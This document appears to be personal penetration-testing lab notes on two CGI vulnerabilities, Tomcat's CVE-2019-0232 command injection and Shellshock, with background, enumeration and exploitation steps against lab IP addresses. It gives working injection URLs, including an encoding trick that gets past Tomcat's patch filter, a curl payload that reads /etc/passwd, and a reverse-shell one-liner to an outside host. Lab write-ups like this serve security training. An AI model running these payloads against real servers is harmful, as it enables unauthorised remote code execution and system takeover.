# tomcat cgi
## info
CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system.  
Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.  
The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.  
In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.  
The enableCmdLineArguments setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string. If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments. This feature can make CGI scripts more flexible and easier to write by allowing parameters to be passed to the script without using environment variables or standard input.  
<pre>http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby</pre>
However, a problem arises when enableCmdLineArguments is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.  
For instance, an attacker can append dir to a valid command using & as a separator to execute dir on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after & to execute any command on the server. An example of this is http://example.com/cgi-bin/hello.bat?&dir, which passes &dir as an argument to hello.bat and executes dir on the server. As a result, an attacker can exploit the input validation error of the CGI Servlet to run any command on the server.  
## enumeration
<pre>
$ nmap -p- -sC -Pn 10.129.204.227 --open 

8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
</pre>
One way to uncover web server content is by utilising the ffuf web enumeration tool along with the dirb common.txt wordlist. Knowing that the default directory for CGI scripts is /cgi, either through prior knowledge or by researching the vulnerability, we can use the URL http://10.129.204.227:8080/cgi/FUZZ.cmd or http://10.129.204.227:8080/cgi/FUZZ.bat to perform fuzzing.  
<pre>
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

  * FUZZ: welcome
</pre>
## exploitation
cgi dirs are tipically /cgi/ and /cgi-bin/  
!!! maybe /cgi/ gives back http 404 but it is a valid path, and we should start fuzzing the files .bat .sh etc under /cgi/ !!!  
As discussed above, we can exploit CVE-2019-0232 by appending our own commands through the use of the batch command separator &. We now have a valid CGI script path discovered during the enumeration at http://10.129.204.227:8080/cgi/welcome.bat  
<pre>http://10.129.204.227:8080/cgi/welcome.bat?&dir</pre>
Navigating to the above URL returns the output for the dir batch command, however trying to run other common windows command line apps, such as whoami doesn't return an output.  
Retrieve a list of environmental variables by calling the set command: http://10.129.204.227:8080/cgi/welcome.bat?&set  
From the list, we can see that the PATH variable has been unset, so we will need to hardcode paths in requests:
<pre>http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe</pre>
The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.  
<pre>http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe</pre>
## shellshock (CVE-2014-6271)
tipical cgi directory: /CGI-bin  
The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable.  
### payload code
<pre>$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"</pre>
### full attack code
<pre>
$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
/access.cgi           (Status: 200) [Size: 0]

$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
</pre>
### reverse shell
<pre>
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
</pre>
